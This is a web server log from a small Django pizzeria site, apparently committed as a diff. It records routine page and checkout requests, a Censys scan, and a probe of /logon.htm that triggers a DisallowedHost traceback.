+[2025-02-12 15:11:34 +0000] [19484] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [12/Feb/2025:15:11:34 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-12 15:12:06 +0000] [19486] [DEBUG] GET /
+ - - [12/Feb/2025:15:12:06 +0000] "GET /?item_name=Pizza+ HTTP/1.1" 200 5804 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-12 15:12:26 +0000] [19481] [DEBUG] GET /
+ - - [12/Feb/2025:15:12:26 +0000] "GET /?item_name=Pizza+portu HTTP/1.1" 200 5258 "http://34.39.141.209/?item_name=Pizza+" "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Mobile Safari/537.36"
+[2025-02-12 16:16:41 +0000] [19484] [DEBUG] GET /
+ - - [12/Feb/2025:16:16:41 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
+[2025-02-12 16:26:37 +0000] [19481] [DEBUG] GET /
+ - - [12/Feb/2025:16:26:37 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 MicroMessenger/7.0.4(0x17000428) NetType/WIFI Language/zh_CN"
+[2025-02-12 16:30:44 +0000] [19484] [DEBUG] GET /
+ - - [12/Feb/2025:16:30:44 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+[2025-02-12 16:34:23 +0000] [19482] [DEBUG] GET /
+ - - [12/Feb/2025:16:34:23 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-12 16:34:24 +0000] [19482] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [12/Feb/2025:16:34:24 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-12 16:34:29 +0000] [19486] [DEBUG] GET /
+ - - [12/Feb/2025:16:34:29 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-12 16:34:34 +0000] [19485] [DEBUG] GET /checkout/
+ - - [12/Feb/2025:16:34:34 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-12 16:35:40 +0000] [19483] [DEBUG] GET /checkout/
+ - - [12/Feb/2025:16:35:40 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36"
+[2025-02-12 16:38:05 +0000] [19482] [DEBUG] GET /
+ - - [12/Feb/2025:16:38:05 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-12 16:38:06 +0000] [19486] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [12/Feb/2025:16:38:06 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-12 16:38:15 +0000] [19485] [DEBUG] GET /checkout/
+ - - [12/Feb/2025:16:38:15 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-12 16:38:24 +0000] [19484] [DEBUG] GET /
+ - - [12/Feb/2025:16:38:24 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-12 16:38:29 +0000] [19483] [DEBUG] GET /checkout/
+ - - [12/Feb/2025:16:38:29 +0000] "GET /checkout/ HTTP/1.1" 200 4219 "http://34.39.141.209/" "Mozilla/5.0 (Linux; Android 13; moto g52 Build/T2SRS33.72-22-4-9; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/132.0.6834.163 Mobile Safari/537.36"
+[2025-02-12 16:43:27 +0000] [19483] [DEBUG] GET /
+ - - [12/Feb/2025:16:43:27 +0000] "GET / HTTP/1.1" 200 6355 "-" "-"
+[2025-02-12 16:43:33 +0000] [19485] [DEBUG] GET /
+ - - [12/Feb/2025:16:43:33 +0000] "GET / HTTP/1.1" 200 6355 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2025-02-12 16:43:36 +0000] [19481] [DEBUG] GET /favicon.ico
+Not Found: /favicon.ico
+ - - [12/Feb/2025:16:43:36 +0000] "GET /favicon.ico HTTP/1.1" 404 2540 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
+[2025-02-12 16:43:38 +0000] [19484] [DEBUG] GET /
+ - - [12/Feb/2025:16:43:38 +0000] "GET / HTTP/1.1" 200 6355 "-" "-"
+[2025-02-12 16:43:38 +0000] [19484] [DEBUG] GET /logon.htm
+Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Traceback (most recent call last):
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/core/handlers/exception.py", line 55, in inner
+    response = get_response(request)
+               ^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/utils/deprecation.py", line 128, in __call__
+    response = self.process_request(request)
+               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/middleware/common.py", line 48, in process_request
+    host = request.get_host()
+           ^^^^^^^^^^^^^^^^^^
+  File "/home/kaikydsousa/PizzariaDjango/venv/lib/python3.11/site-packages/django/http/request.py", line 151, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /logon.htm
+ - - [12/Feb/2025:16:43:38 +0000] "GET /logon.htm HTTP/1.1" 400 57339 "-" "Hello World"
+[2025-02-12 16:52:53 +0000] [19483] [DEBUG] GET /
+ - - [12/Feb/2025:16:52:53 +0000] "GET / HTTP/1.1" 200 6355 "-" "Hello World"
